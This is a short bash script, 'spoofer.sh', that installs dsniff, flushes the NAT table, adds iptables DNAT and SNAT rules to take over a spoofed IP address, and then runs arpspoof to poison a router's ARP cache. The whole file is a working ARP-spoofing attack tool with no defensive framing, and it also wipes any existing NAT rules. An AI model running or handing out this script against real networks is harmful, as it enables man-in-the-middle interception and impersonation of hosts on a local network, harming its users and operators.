#!/bin/bash

if [ "$#" -ne 3 ];then
    echo "Usage: ./spoofer.sh <spoofed> <original> <router>";
    exit 0
fi

if ! which arpspoof &> /dev/null
then
    echo "Arpspoof is not installed. Installing now..."
    sudo apt install dsniff
fi


spoofed=$1
original=$2
router=$3

echo "Adding NAT rules to iptables..."
sudo iptables -t nat -F
sudo iptables -t nat -A PREROUTING -d $spoofed -j DNAT --to-destination $original
sudo iptables -t nat -A POSTROUTING -s $original -j SNAT --to-source $spoofed

echo "Starting ARP Poisoning on the router..."
sudo arpspoof -i $(ip a | grep $original | tail -c 5) -t $router $spoofed